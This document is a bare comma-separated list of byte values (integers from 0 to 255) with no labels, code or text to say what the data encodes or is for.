0,7,198,146,155,13,101,195,112,140,97,164,63,117,42,99,161,239,199,147,178,124,200,196,194,28,10,15,49,123,143,168,235,174,10,37,234,240,239,248,27,31,2,25,144,95,82,74,79,85,17,167,229,172,249,234,53,252,237,160,27,22,75,21,8,214,27,91,75,26,28,157,186,171,253,58,45,54,113,46,28,81,1,28,45,15,203,150,214,83,64,51,62,151,247,39,102,107,39,60,234,129,35,80,41,42,145,150,149,10,38,191,46,156,106,236,32,109,47,40,240,180,232,131,241,114,222,141,140,93,124,20,49,8,149,225,231,252,14,114,188,188,245,190,90,19,65,228,150,31,6,17,2,18,121,233,222,180,20,160,33,250,139,172,73,70,125,53,25,219,6,31,86,91,73,143,187,161,103,42,111,43,59,40,125,72,80,71,46,202,199,157,139,78,65,43,124,151,123,122,33,59,46,38,171,203,99,0,37,145,128,154,158,30,59,193,34,167,59,167,114,99,120,58,228,242,244,147,178,165,129,175,221,18,69,20,36,92,206,168,194,191,78,105,253,234,249,160,26,17,27,255,204,64,94,89,4,28,73,249,125,178,93,188,43,176,143,235,64,6,64,111,71,154,49,94,64,17,94,147,204,162,100,32,45,48,51,113,125,56,82,119,100,128,134,201,203,83,27,35,129,155,102,127,125,45,127,125,241,209,127,97,50,217,150,218,159,87,105,157,54,145,186,184,47,36,97,49,160,189,184,241,171,243,208,215,199,119,14,104,114,12,18,164,175,166,10,37,177,254,249,164,74,3,90,185,203,71,58,59,31,2,140,224,40,224,119,186,32,250,228,225,47,108,10,127,92,208,29,44,84,26,219,213,192,244,54,39,45,48,103,50,115,104,79,55,100,158,128,232,219,80,70,48,155,153,60,60,30,108,52,50,234,251,59,23,52,170,140,230,141,30,105,218,219,202,241,165,106,109,123,122,186,191,160,231,169,215,196,209,192,28,68,10,27,16,81,184,177,166,28,63,253,237,240,44,29,3,7,247,215,26,33,89,20,7,202,229,66,162,20,234,32,229,164,112,94,32,90,88,27,157,26,77,80,68,224,145,253,235,116,50,78,96,37,59,113,55,81,63,60,157,203,156,193,38,211,123,202,155,60,125,15,107,46,186,167,171,56,102,60,135,198,192,156,11,17,196,130,156,161,189,1,124,121,96,240,190,236,191,221,180,154,129,206,30,21,81,19,23,19,186,180,182,28,2,171,246,234,47,0,91,0,184,214,65,26,67,11,2,139,254,30,246,9,238,112,186,185,107,69,126,90,51,92,135,0,91,26,74,146,133,217,239,125,124,37,36,97,126,111,42,67,118,42,136,155,135,3,85,156,49,217,158,124,39,110,54,43,171,169,185,100,13,115,201,198,138,26,6,126,222,172,203,251,166,122,109,60,252,160,239,172,165,234,169,135,210,77,64,68,22,31,90,93,225,179,191,83,232,188,224,183,101,90,74,2,165,144,70,12,80,18,100,150,171,65,162,68,60,90,171,251,106,0,55,18,120,92,134,16,15,1,11,128,147,214,251,61,43,126,49,59,114,110,113,79,114,60,129,145,130,51,71,218,49,157,214,42,125,102,215,47,217,174,218,100,97,125,219,164,218,6,81,86,210,223,212,169,236,115,29,96,250,251,201,220,162,255,253,198,212,6,4,104,90,92,123,93,252,251,74,83,174,224,238,183,127,65,81,70,150,90,26,93,89,126,30,158,231,69,75,5,39,109,245,185,126,64,59,10,51,203,154,81,31,90,16,221,139,218,161,101,58,58,63,69,96,110,116,33,31,181,196,138,154,51,78,211,123,166,158,33,33,123,222,53,250,190,185,37,123,159,199,187,208,108,22,0,202,212,216,177,30,117,19,100,229,251,173,249,161,247,237,170,155,76,93,3,87,6,30,20,23,177,70,18,230,230,167,232,61,26,18,62,175,70,90,11,44,85,30,158,189,24,92,93,123,40,182,237,108,69,37,43,51,235,219,39,77,91,90,208,141,254,32,125,46,82,57,42,97,41,42,33,44,165,132,204,130,25,82,211,123,141,69,60,33,44,158,62,189,241,247,119,122,242,222,191,210,90,92,0,210,138,6,207,14,48,12,121,228,253,226,170,186,225,241,239,138,93,5,13,90,10,0,9,76,251,94,68,252,230,238,181,43,32,17,106,247,95,90,94,85,11,27,204,193,69,82,83,125,55,176,237,119,119,62,58,105,221,148,75,2,43,26,192,232,139,124,99,34,117,106,32,114,113,118,89,55,168,132,131,159,100,87,154,156,141,81,102,2,123,219,52,160,182,237,110,106,239,212,183,151,118,18,91,128,205,78,187,25,119,4,112,244,188,161,168,191,226,238,241,145,0,28,74,86,75,71,15,26,235,87,10,167,253,230,32,101,40,65,62,238,72,83,7,75,20,209,140,129,91,67,5,79,42,246,123,114,43,37,50,47,219,156,61,77,26,199,154,129,214,97,97,93,58,58,38,60,127,44,115,42,189,220,193,142,111,156,198,150,213,17,104,117,96,192,46,241,231,251,103,102,254,218,164,205,19,23,77,232,172,26,184,23,44,13,113,253,237,161,233,231,183,173,235,208,22,74,79,29,2,10,27,79,171,33,12,251,240,243,125,47,108,17,62,146,41,83,93,43,19,159,151,213,21,94,9,38,49,236,33,60,106,118,43,49,135,134,26,41,24,134,129,149,152,44,99,99,127,49,189,61,63,107,97,126,242,202,209,173,107,138,154,192,144,95,48,45,126,149,166,235,185,183,103,99,182,134,248,150,19,71,21,194,132,71,165,4,45,17,229,164,176,188,184,179,230,169,155,212,71,69,26,8,65,120,93,26,173,94,127,228,156,238,32,114,56,75,112,247,94,32,87,60,11,236,141,143,87,69,79,61,131,176,97,112,45,111,123,41,203,53,74,115,64,216,154,141,254,36,51,49,138,62,161,101,117,107,100,114,229,145,144,252,111,138,211,219,206,73,39,33,18,215,234,241,207,183,103,124,242,139,229,27,29,76,13,202,152,27,177,85,80,12,138,253,236,164,187,161,234,215,235,80,7,22,13,16,65,82,83,74,241,27,148,251,227,231,43,37,122,96,42,105,55,10,94,42,7,193,151,219,66,16,43,34,151,160,99,105,96,99,24,114,159,119,4,50,70,205,158,196,209,122,186,52,150,56,180,111,101,104,127,55,255,234,193,247,124,141,193,143,209,9,13,112,74,143,187,235,187,254,8,122,246,249,191,71,95,104,91,218,219,76,184,85,18,95,252,183,240,226,164,189,225,248,235,90,93,65,69,8,92,64,78,88,75,10,157,224,187,248,62,49,43,35,54,41,92,17,93,126,78,147,158,219,8,92,43,46,232,160,60,42,48,117,111,167,153,102,78,60,94,204,220,194,10,32,219,42,208,117,246,98,57,42,127,234,222,146,144,190,104,196,223,206,217,85,108,42,125,131,233,170,225,185,53,177,240,249,163,73,80,86,88,214,196,74,27,4,27,78,168,189,224,245,164,53,176,225,234,94,70,2,5,64,75,27,21,0,65,23,149,254,235,254,123,53,46,125,42,113,41,1,64,37,83,209,153,209,5,75,108,59,151,242,60,60,99,117,62,190,209,101,66,117,95,150,151,213,18,122,210,53,193,33,180,114,124,102,39,234,169,240,131,216,112,193,192,168,11,21,2,113,30,223,168,250,160,20,42,226,166,161,251,27,73,2,91,211,65,16,74,85,84,98,233,228,170,200,160,107,183,248,186,7,27,12,93,74,131,71,2,80,65,63,143,186,172,255,62,62,122,113,62,125,65,80,78,36,155,132,150,208,79,27,35,118,131,240,60,102,107,110,59,173,133,47,66,116,16,152,130,129,13,30,193,118,205,36,160,106,126,112,100,161,181,241,209,176,101,200,129,215,1,15,81,48,92,152,176,171,189,13,53,243,172,245,165,16,19,31,163,206,65,61,29,116,112,4,248,182,162,15,240,49,183,253,160,91,84,86,101,19,213,64,95,73,17,10,142,251,240,61,96,45,33,34,127,125,89,67,11,37,208,185,142,137,71,92,119,46,132,100,60,96,33,47,58,247,137,121,90,111,139,194,199,194,30,40,222,34,151,230,184,116,100,48,122,211,175,176,202,176,239,129,202,221,80,9,10,45,8,197,160,173,237,83,46,177,242,241,162,29,91,64,190,144,0,6,89,114,70,17,250,68,183,20,225,48,186,237,246,69,111,75,37,74,137,16,91,72,83,94,133,148,240,54,102,82,117,85,40,101,95,16,60,46,162,147,195,209,82,5,47,203,151,127,58,39,121,55,62,190,203,127,123,63,142,216,214,200,127,97,210,34,204,187,248,119,97,12,39,190,189,177,162,176,184,218,208,221,27,29,50,49,76,78,164,239,182,122,53,234,254,247,51,25,11,26,184,214,54,77,1,30,70,158,229,66,178,68,231,48,186,248,177,73,35,20,61,71,140,66,21,77,91,128,217,215,183,116,32,105,56,63,41,63,49,17,119,53,158,138,142,205,82,192,42,215,132,102,96,33,121,39,66,236,170,101,101,60,201,220,225,133,76,101,220,222,145,241,188,1,109,58,115,161,228,184,167,252,244,174,195,216,18,14,64,11,13,85,191,220,166,122,63,243,251,241,116,28,83,26,182,206,75,67,65,95,70,158,160,21,224,74,186,57,176,175,114,10,34,86,36,34,219,17,25,28,28,202,139,219,244,61,112,63,44,63,114,110,96,17,114,50,136,214,220,144,8,156,113,204,153,33,100,124,113,127,250,190,183,54,60,52,201,198,144,194,12,16,144,136,203,184,188,118,97,39,182,164,226,250,179,252,239,218,134,129,80,25,16,31,18,17,234,241,246,94,115,167,172,240,45,70,91,14,185,139,69,71,81,15,1,138,174,125,180,83,164,106,250,175,38,6,55,2,105,26,148,15,21,65,1,146,210,214,246,100,58,108,58,63,55,116,109,82,103,125,129,128,218,111,86,150,45,156,209,102,38,103,222,53,240,236,169,37,124,111,128,216,155,14,15,75,173,213,140,241,180,32,122,104,250,240,186,236,186,190,180,144,209,93,26,89,20,117,23,93,206,179,160,16,241,224,224,181,111,80,70,22,249,88,83,92,80,65,5,215,167,52,199,93,38,97,246,255,126,29,37,2,46,71,152,83,15,1,11,146,255,220,166,124,49,57,58,63,107,117,120,27,126,46,134,209,150,110,73,176,87,139,222,97,47,125,207,47,167,236,237,99,122,110,197,254,148,29,10,21,222,159,212,200,253,110,82,58,189,165,173,173,231,253,174,224,138,6,80,95,89,1,18,84,186,183,94,20,170,186,161,245,45,16,87,24,178,28,64,15,85,7,10,151,251,30,64,79,39,40,182,249,126,0,63,86,42,202,214,85,77,10,65,135,136,204,101,116,96,52,53,33,123,100,48,0,24,241,154,204,193,124,75,195,35,155,153,125,123,119,144,96,179,255,185,99,42,234,171,254,147,92,70,25,210,205,151,253,79,110,95,114,244,178,245,177,231,145,244,172,209,84,18,13,16,75,92,72,81,176,94,15,254,230,172,238,113,1,17,48,181,42,28,29,28,11,116,214,139,94,75,78,108,53,173,251,104,6,63,112,116,154,198,76,85,72,1,146,157,152,101,120,107,58,122,127,100,52,113,106,55,194,199,193,157,124,5,139,97,150,10,121,44,58,196,110,225,182,181,113,38,232,212,183,151,11,76,25,210,132,94,224,23,108,29,127,166,178,180,236,162,250,239,240,145,29,81,20,50,1,90,19,81,171,70,14,186,227,196,247,49,42,26,38,164,89,69,92,65,30,137,200,219,30,71,28,97,97,240,253,49,117,57,50,111,198,219,81,2,72,74,146,217,139,105,122,49,101,58,125,101,63,116,102,60,174,159,141,193,104,73,139,199,150,20,48,55,121,215,105,179,248,250,117,96,247,217,183,144,5,23,1,144,196,94,167,4,48,29,120,230,165,163,250,191,252,165,244,202,92,74,21,71,92,27,63,16,171,71,18,232,140,231,58,52,107,87,40,150,10,11,78,85,15,147,150,193,15,74,76,46,57,171,96,31,111,111,50,116,232,208,66,25,90,157,221,129,150,13,116,107,59,103,250,122,126,113,115,119,175,154,202,130,114,200,199,212,155,19,102,33,110,146,98,165,162,251,46,38,254,168,175,203,27,76,14,144,221,28,230,67,108,79,60,230,162,163,235,161,254,245,248,195,68,18,13,26,4,71,85,88,225,12,14,255,161,250,126,105,122,65,36,251,1,95,26,44,19,199,158,142,91,16,21,56,153,250,60,48,110,111,96,116,137,204,83,110,93,218,158,201,193,122,58,50,57,112,253,42,127,106,96,44,238,136,138,252,56,222,193,206,208,121,33,45,98,206,161,189,184,237,6,122,247,155,200,90,6,76,15,232,205,17,224,30,122,73,244,187,214,190,252,231,234,184,248,145,84,16,4,8,31,6,15,88,236,6,142,167,161,168,42,51,52,87,62,251,1,67,26,104,78,154,198,153,22,51,93,46,159,234,106,38,121,34,112,40,219,100,86,106,68,199,129,141,128,96,109,46,216,103,184,114,109,107,39,54,181,236,215,176,46,200,193,140,208,0,24,117,92,193,252,186,174,185,37,114,187,208,165,71,1,71,80,194,143,80,169,31,6,73,187,189,191,180,215,186,242,238,240,80,0,77,1,91,3,70,31,23,17,76,138,240,182,154,58,52,42,76,50,117,70,11,12,48,11,159,143,223,65,55,50,34,207,243,100,126,105,57,32,252,135,100,83,113,28,198,158,141,136,96,207,46,155,33,253,96,44,61,62,126,249,224,219,236,110,200,202,221,139,95,90,49,30,222,164,241,237,246,113,61,234,234,185,30,82,24,86,203,189,6,85,85,70,95,233,189,246,245,203,179,160,255,170,64,64,99,108,17,26,82,85,17,93,23,148,225,172,253,102,61,47,63,102,63,65,67,86,121,30,147,140,193,82,94,45,62,195,243,96,109,121,52,58,178,219,111,66,125,89,195,156,148,12,61,199,50,207,56,163,13,109,96,33,186,170,168,148,190,58,141,135,135,2,73,17,109,9,222,185,164,246,171,127,251,238,234,174,25,90,23,81,194,197,94,89,5,80,84,249,244,224,239,187,45,176,252,235,93,64,22,3,16,29,68,15,12,70,17,133,230,227,186,123,62,43,63,45,25,65,79,15,110,120,209,130,219,15,71,122,51,155,226,115,38,117,115,59,170,152,17,0,113,45,216,145,204,74,122,210,112,138,75,230,122,127,58,101,230,173,250,204,236,62,200,129,150,4,88,0,32,30,215,250,231,182,85,107,251,242,225,166,71,82,66,75,210,11,17,24,31,95,4,140,248,171,81,164,97,229,162,240,65,69,2,5,29,141,71,25,72,75,87,157,188,227,252,34,121,49,32,55,30,43,80,93,126,132,128,142,128,21,69,113,122,197,182,123,125,117,47,119,173,221,119,66,47,219,150,145,207,30,37,192,34,205,33,167,117,126,43,33,186,165,174,235,182,110,217,207,194,7,13,89,115,13,153,177,236,224,16,115,186,188,161,229,8,75,71,191,208,95,86,74,23,80,14,168,78,176,18,168,122,227,135,224,17,93,10,49,28,204,74,69,80,93,22,216,170,181,102,60,78,96,51,90,125,93,67,111,40,152,220,128,139,31,64,98,118,197,60,123,110,121,70,87,190,209,99,11,58,221,212,192,133,30,48,222,96,202,189,246,98,63,104,60,240,177,250,143,230,241,223,155,206,90,17,24,99,70,85,186,178,162,12,17,228,239,232,183,74,81,76,225,128,65,59,22,89,81,84,229,66,186,15,250,118,254,245,182,6,111,100,46,90,138,65,8,80,83,28,148,142,235,109,106,111,91,32,114,49,116,10,112,47,236,193,142,218,85,82,123,206,155,122,60,54,33,115,50,190,154,127,59,41,128,198,130,141,30,112,148,149,202,235,186,54,36,122,33,211,175,250,186,230,169,217,129,154,3,29,123,106,77,40,204,178,189,28,103,144,233,171,114,29,66,76,226,143,65,79,74,1,0,137,255,69,162,79,187,57,232,255,38,73,63,17,105,8,156,19,31,29,74,208,143,202,240,61,93,35,44,51,55,108,104,12,112,126,218,135,134,221,19,193,103,205,213,104,49,8,59,105,33,178,246,47,100,111,222,134,139,196,30,8,219,132,205,204,246,98,116,33,63,160,189,173,250,176,239,218,207,218,18,95,10,26,18,18,161,246,203,28,111,243,252,241,115,92,15,7,163,128,93,23,74,70,0,158,150,66,238,75,233,119,231,227,126,99,59,64,92,107,219,94,85,70,95,194,142,214,240,61,42,111,33,122,61,117,49,84,44,117,136,147,199,110,71,139,50,141,216,48,123,44,121,43,160,178,251,126,123,51,157,145,130,156,81,17,220,205,202,229,251,58,109,42,189,251,165,171,179,175,169,156,195,140,81,69,10,65,87,76,207,163,202,28,167,234,231,249,53,27,72,92,254,194,26,70,22,14,70,215,224,67,236,69,187,112,241,244,112,29,55,26,61,80,135,11,21,26,90,132,133,148,240,49,59,111,57,122,60,60,120,82,29,121,159,138,218,57,31,199,59,141,244,104,106,124,131,100,189,252,238,56,123,37,222,220,139,81,97,16,210,139,129,189,247,107,84,102,230,171,239,184,161,190,238,220,215,93,5,30,11,5,13,31,168,225,190,18,176,167,251,176,51,6,17,104,228,65,95,22,80,21,30,220,224,25,179,76,75,112,173,228,118,69,55,2,61,135,134,61,94,90,17,146,223,128,170,108,122,35,59,63,123,101,110,17,31,48,129,146,155,40,5,159,113,152,151,41,106,124,143,55,163,172,169,126,114,110,208,248,139,19,76,9,151,159,216,251,230,110,82,120,187,160,199,236,252,241,175,244,219,73,5,107,10,2,30,81,240,182,77,79,240,186,230,191,46,17,27,55,247,1,1,7,28,11,0,220,178,24,28,18,108,117,242,191,109,42,112,80,105,155,152,76,68,89,121,219,157,218,123,44,48,110,40,102,97,100,30,79,44,242,129,141,154,36,79,211,83,141,73,58,99,110,158,62,179,173,185,103,126,236,157,160,154,0,77,17,144,142,206,187,69,106,17,123,225,241,190,184,179,234,244,234,132,92,64,1,64,19,11,76,42,182,61,82,176,186,249,241,51,74,23,62,190,70,69,78,85,7,28,220,138,5,29,81,38,57,242,237,106,91,42,59,51,197,157,66,4,7,1,130,159,152,96,54,48,45,99,51,96,115,118,97,112,171,193,204,128,112,6,219,97,208,84,125,99,119,152,48,186,190,175,112,19,183,156,249,130,81,109,17,196,143,22,190,67,118,15,42,149,212,173,164,241,134,253,241,207,84,80,78,74,11,91,81,10,177,79,18,232,224,238,182,43,122,124,47,181,13,67,95,17,7,133,150,208,3,10,31,61,124,244,191,61,31,36,123,61,192,157,82,77,72,64,135,141,223,61,124,93,52,96,103,97,123,58,32,109,173,155,204,193,51,75,211,206,141,79,122,6,44,146,101,254,184,147,115,97,238,138,242,144,31,7,77,163,231,82,160,25,98,10,33,172,178,187,161,160,147,232,246,222,76,109,1,90,19,91,93,28,186,70,80,232,188,253,83,47,52,3,119,247,16,7,0,41,20,139,180,140,64,68,76,57,57,173,103,105,59,63,96,105,199,214,66,67,26,183,193,157,136,39,38,34,45,38,230,96,100,58,97,109,242,234,131,204,111,135,129,143,187,12,122,49,43,215,101,187,255,177,107,42,171,208,183,142,81,6,10,139,130,73,232,25,112,19,42,152,178,161,185,162,160,239,248,208,6,80,39,17,81,90,93,86,225,75,83,228,160,141,38,37,108,102,113,184,90,53,87,45,9,245,204,205,3,74,24,54,213,164,61,126,121,100,62,47,204,154,0,50,26,193,237,132,137,105,54,34,202,106,253,16,121,55,115,102,243,159,215,248,112,219,139,206,213,29,121,126,58,149,252,189,166,181,103,48,254,223,183,74,90,64,10,139,143,80,169,23,113,79,250,182,224,202,197,171,176,253,248,215,12,2,85,16,1,82,93,27,187,87,222,225,227,224,58,61,108,3,106,238,72,7,94,37,85,147,146,153,21,10,97,46,219,241,43,126,54,35,125,51,153,97,0,50,95,216,194,131,150,32,21,112,202,59,231,48,97,113,33,126,242,171,147,236,124,169,148,219,155,29,60,118,30,149,186,251,226,248,15,97,254,241,163,71,95,92,23,144,197,23,169,85,90,9,171,230,180,181,231,191,242,241,235,69,0,90,27,106,0,79,93,88,64,87,207,170,234,253,102,42,125,65,124,117,91,91,9,60,85,128,142,153,91,64,110,60,131,171,89,28,121,36,58,174,145,39,22,37,80,216,244,129,143,105,156,53,138,38,166,103,109,106,97,161,252,175,143,172,124,200,198,192,141,11,24,123,16,133,189,187,132,237,110,101,188,171,248,6,0,31,8,128,205,80,27,71,80,14,170,252,237,188,233,186,231,244,240,65,26,2,31,71,81,30,21,84,93,86,223,188,187,182,125,61,43,42,113,106,1,19,95,121,19,135,143,219,84,94,49,77,207,160,115,1,121,101,42,252,159,111,78,116,6,212,131,159,127,101,222,42,189,106,246,58,109,120,58,162,244,184,138,190,61,183,219,223,87,79,110,111,12,215,190,179,187,235,46,251,246,187,227,71,92,30,21,139,17,61,60,23,80,29,161,244,246,161,160,37,254,185,248,92,71,2,1,30,72,65,15,86,7,28,140,254,240,251,102,63,40,32,106,111,16,77,93,60,83,155,234,139,31,64,48,46,151,235,115,124,104,115,43,173,133,101,76,115,72,150,138,131,18,96,158,42,174,103,240,103,123,113,102,187,239,241,150,170,47,226,208,216,70,17,13,123,30,149,201,191,231,14,112,230,166,154,164,24,19,14,75,203,11,82,78,15,18,29,166,172,178,20,189,57,228,228,177,93,24,19,95,73,134,10,94,84,28,80,157,252,234,108,115,45,92,34,120,125,80,79,88,100,132,138,130,213,79,16,66,54,135,226,49,125,45,43,37,182,219,53,66,113,197,147,139,223,6,123,210,34,216,40,236,44,36,122,33,208,170,184,145,190,180,135,207,223,80,15,81,55,74,176,190,251,250,10,107,186,166,249,183,92,27,31,249,208,83,77,87,27,86,7,172,91,240,81,190,107,189,174,236,91,67,11,61,27,219,64,77,26,95,61,254,176,239,103,35,98,45,33,45,125,90,75,119,46,205,159,203,149,79,82,43,108,216,13,97,44,106,98,102,190,198,110,99,109,128,201,142,141,93,113,194,49,202,169,251,123,109,48,107,234,177,234,215,175,191,196,219,194,74,95,15,45,10,73,229,251,185,21,46,243,234,249,214,26,81,7,190,154,31,28,89,5,118,151,231,67,170,76,191,48,254,225,172,69,37,14,114,31,157,64,12,29,95,28,143,215,235,98,32,45,41,112,113,51,107,1,111,115,202,193,239,149,9,29,59,203,159,102,58,110,109,53,50,218,155,97,126,110,168,134,224,242,70,32,138,222,138,232,166,55,122,48,58,253,233,249,231,247,233,208,212,194,83,19,15,10,30,84,252,187,174,28,53,228,246,245,61,6,66,25,229,206,83,70,27,85,30,142,255,79,162,19,187,53,242,248,118,7,39,19,94,1,148,2,77,88,26,208,142,145,241,61,34,121,106,103,97,41,96,27,108,52,156,128,157,128,4,154,48,215,216,122,58,110,121,53,33,236,171,47,111,47,201,155,155,141,30,86,193,213,214,186,180,0,123,117,125,165,166,224,231,183,159,196,140,156,18,84,87,95,22,72,252,247,174,12,110,225,255,187,127,71,41,27,228,203,17,82,61,7,27,146,225,39,186,78,252,107,176,237,103,69,120,17,66,75,156,10,25,92,7,154,139,209,242,18,125,62,43,37,126,106,112,74,59,126,145,147,134,51,71,145,113,139,129,96,43,103,29,46,160,178,175,62,123,25,223,150,193,0,23,17,192,205,128,184,172,118,119,113,253,167,249,182,164,183,253,223,207,140,109,79,10,19,92,60,166,241,183,13,230,177,230,173,127,8,71,65,247,139,1,1,75,11,10,250,248,21,184,93,164,55,240,181,126,71,55,17,124,30,221,16,25,4,93,219,226,218,244,103,36,60,73,39,103,37,120,84,111,48,202,193,218,108,81,221,106,148,132,39,97,98,148,43,162,247,176,39,62,115,139,150,205,0,22,65,157,137,201,230,180,58,19,104,186,240,245,173,153,190,215,143,212,22,4,27,17,4,123,93,187,178,86,79,176,186,138,235,111,0,11,6,165,91,91,66,89,85,10,219,187,79,178,21,62,112,251,254,102,29,117,2,126,221,157,26,65,68,83,209,147,152,234,54,50,100,59,36,114,125,107,16,126,47,220,193,156,105,81,199,62,217,131,97,33,98,158,115,162,235,172,101,48,117,182,244,151,92,95,105,218,205,204,186,4,98,79,113,160,245,173,234,189,247,234,248,218,88,80,24,16,27,74,76,177,177,17,94,250,243,173,245,51,110,3,119,228,26,64,78,11,7,4,158,225,71,66,18,124,32,240,172,126,11,101,126,117,155,214,66,4,10,11,202,157,218,123,44,59,35,106,39,114,46,55,83,48,245,129,209,130,47,75,192,35,192,17,125,113,119,192,41,170,234,185,97,97,254,192,162,208,5,10,91,220,205,201,165,1,107,88,39,189,152,238,176,164,225,236,248,207,24,75,1,74,2,12,21,72,241,80,82,250,171,161,232,127,122,22,124,255,68,91,1,27,45,27,142,149,70,67,69,58,42,244,225,114,69,126,60,46,192,209,82,91,28,91,244,132,139,43,54,97,111,105,51,107,63,42,127,112,255,157,209,158,124,85,145,206,203,73,97,113,103,196,53,179,251,170,38,96,233,227,165,208,19,16,23,128,223,12,177,4,117,73,122,182,178,255,185,167,187,228,238,195,6,30,25,0,81,29,81,29,225,94,75,249,167,196,241,45,52,68,102,249,72,18,47,1,19,209,138,245,69,82,77,63,123,238,164,42,43,117,102,113,193,134,84,69,89,199,146,158,192,122,44,64,62,40,35,122,15,112,60,114,239,202,146,159,47,71,218,154,155,11,43,49,33,219,58,250,189,233,116,98,234,218,183,146,19,13,91,215,153,77,251,85,48,9,100,231,231,165,234,161,242,228,186,138,84,56,79,107,90,90,83,17,225,58,72,188,177,160,42,47,56,16,62,228,90,83,12,43,7,154,150,145,25,16,72,46,107,240,18,107,26,36,50,37,133,152,66,21,91,212,129,141,204,39,108,54,63,122,166,122,18,97,98,49,229,155,150,135,61,138,192,199,217,29,33,1,54,219,164,215,162,171,117,96,152,192,248,149,75,66,65,204,218,94,191,31,123,84,58,228,224,191,164,210,176,243,224,151,93,21,110,74,31,17,84,88,179,13,94,251,172,226,112,101,42,102,82,229,10,77,22,36,31,132,136,129,94,68,93,56,207,235,43,126,112,36,42,49,133,135,66,104,64,212,154,194,144,101,36,49,208,48,160,42,53,120,96,109,222,202,143,255,51,200,145,206,193,8,120,99,110,223,168,250,174,181,52,122,154,197,245,30,75,19,17,194,205,76,160,88,119,17,250,182,183,249,205,186,148,239,238,95,17,20,68,0,90,82,63,57,163,76,255,250,183,182,106,49,96,11,55,175,68,82,66,45,87,128,202,137,91,74,43,46,131,250,97,109,121,121,60,36,203,53,90,105,90,157,146,251,215,126,192,48,212,122,252,32,97,108,100,28,177,236,146,172,8,135,145,228,207,4,42,34,76,143,130,225,182,225,127,101,170,161,249,30,1,28,25,128,197,27,186,1,91,19,233,230,162,245,231,164,242,253,160,40,84,23,27,8,1,26,22,75,31,76,201,176,245,141,123,61,54,27,41,63,93,87,27,60,17,240,215,214,8,92,49,39,207,235,12,50,48,126,123,182,192,123,6,51,91,198,202,154,138,123,222,52,151,120,246,126,101,97,127,234,244,180,204,166,116,200,134,154,213,14,11,117,18,158,161,204,160,183,107,188,183,171,245,70,81,23,12,194,205,74,85,95,91,29,253,236,162,188,190,160,242,175,234,40,22,26,31,71,87,94,95,62,1,23,212,173,243,238,62,127,119,58,20,57,68,85,93,50,15,147,158,208,81,92,92,59,141,182,123,59,59,110,62,163,155,18,66,116,90,128,192,194,13,101,128,69,216,49,253,123,99,102,100,186,164,170,150,246,53,192,218,199,18,20,1,45,82,152,225,161,184,240,40,135,177,247,200,25,5,86,11,219,65,76,74,85,18,15,233,244,174,186,190,123,250,137,241,80,4,75,89,16,134,91,69,75,31,77,210,186,227,238,125,61,45,58,62,110,95,80,70,110,11,236,157,208,4,6,43,103,151,172,103,39,43,101,59,183,163,123,84,117,94,140,149,238,124,124,210,8,242,112,224,17,63,60,33,243,181,236,143,171,114,209,140,154,70,84,0,6,6,149,164,241,160,16,114,243,177,241,229,71,5,90,163,141,11,77,16,7,18,20,251,231,170,69,187,41,160,227,246,64,126,80,4,8,209,92,25,16,95,76,143,224,172,61,119,98,43,43,119,125,94,87,1,103,153,203,128,139,84,17,42,34,216,33,127,44,59,39,112,176,203,103,12,115,218,220,150,144,76,22,138,122,154,58,251,32,100,96,122,178,180,199,131,171,244,141,202,216,7,82,15,46,92,219,186,178,236,72,40,243,238,249,165,8,19,86,165,141,55,17,89,3,7,29,229,89,174,14,161,112,166,254,233,93,71,86,42,71,193,30,30,22,93,31,145,148,237,102,96,36,106,112,45,52,89,85,61,41,218,209,150,205,85,82,97,61,151,117,115,98,49,48,58,247,209,121,123,111,134,150,199,132,30,121,203,44,214,165,167,122,126,58,123,190,169,182,186,175,169,217,212,220,70,14,94,47,13,85,240,179,180,28,46,243,236,234,248,124,26,29,146,135,64,70,17,23,26,135,140,67,183,75,204,118,250,237,236,0,101,16,61,6,192,22,77,17,83,94,143,140,227,116,60,117,44,59,62,108,44,91,59,36,134,157,220,153,83,16,97,150,153,104,102,45,45,115,124,172,170,35,59,63,218,150,151,129,23,59,199,219,138,235,167,45,97,120,115,161,174,146,231,173,233,192,140,150,27,15,81,11,30,85,184,163,189,28,103,251,170,235,37,74,81,92,181,208,83,74,13,11,64,151,229,64,174,81,161,57,242,175,38,91,120,81,41,65,242,27,15,86,27,158,139,152,183,124,96,73,49,107,102,56,106,17,44,60,136,209,142,214,78,145,47,144,195,104,58,115,112,39,255,247,160,47,22,41,128,220,218,157,97,16,202,208,203,187,160,32,53,104,96,161,163,184,235,255,158,140,207,206,11,27,20,26,13,93,187,193,188,4,37,251,238,161,46,74,13,27,247,144,17,12,12,11,80,221,252,22,176,74,225,48,241,237,105,26,113,18,61,119,204,94,2,26,65,146,223,139,170,116,58,33,49,113,122,101,44,90,103,93,206,195,159,110,14,221,45,217,158,60,122,121,45,55,162,236,168,57,126,125,212,212,144,65,74,25,157,143,148,169,224,98,99,122,231,170,164,180,213,183,231,208,195,71,27,95,77,19,18,9,240,177,235,79,252,251,173,171,114,71,16,93,190,206,68,26,74,72,86,140,233,78,238,85,38,32,251,175,109,64,115,77,42,6,204,38,95,10,69,198,136,152,227,100,112,120,48,34,16,106,42,105,111,53,156,209,239,110,73,219,113,243,151,122,98,96,199,43,174,248,251,126,20,37,223,248,130,0,81,25,157,221,216,249,203,110,84,97,160,230,187,180,241,173,241,196,203,27,91,105,17,6,93,93,235,234,28,68,171,253,253,176,61,4,19,90,191,10,28,87,79,100,2,253,248,25,0,81,108,78,226,250,42,91,126,12,51,152,204,17,15,70,93,208,147,152,242,124,46,111,40,103,114,125,97,67,45,255,156,215,150,62,20,135,45,139,195,122,123,39,194,51,191,182,169,19,126,110,201,174,142,114,22,51,197,159,205,187,85,33,21,60,154,240,232,207,250,170,169,248,209,0,27,30,15,3,12,69,86,163,79,94,188,253,188,235,89,75,102,55,230,68,95,6,81,20,18,138,252,15,64,18,98,93,226,245,126,54,62,58,37,145,192,75,68,72,71,146,145,128,96,122,50,53,122,99,32,47,55,48,108,212,203,233,134,116,14,218,49,141,79,104,48,125,131,115,160,234,220,37,42,239,222,175,142,84,81,17,199,197,77,251,85,110,9,102,248,230,239,180,250,187,244,244,160,64,74,107,84,19,23,93,80,178,16,68,232,188,172,234,111,43,18,62,251,9,64,11,16,14,26,146,138,24,94,93,34,41,167,164,118,45,83,125,94,235,134,0,15,65,90,220,156,142,122,102,34,111,106,51,61,106,106,58,112,244,220,131,134,124,15,202,170,149,79,33,112,122,145,39,179,167,177,114,38,177,154,167,253,1,92,8,164,128,31,177,85,98,90,97,230,253,161,234,208,216,191,244,207,88,30,13,90,19,64,81,88,177,76,28,176,184,252,112,127,43,22,50,163,91,95,93,75,14,220,150,128,5,75,79,46,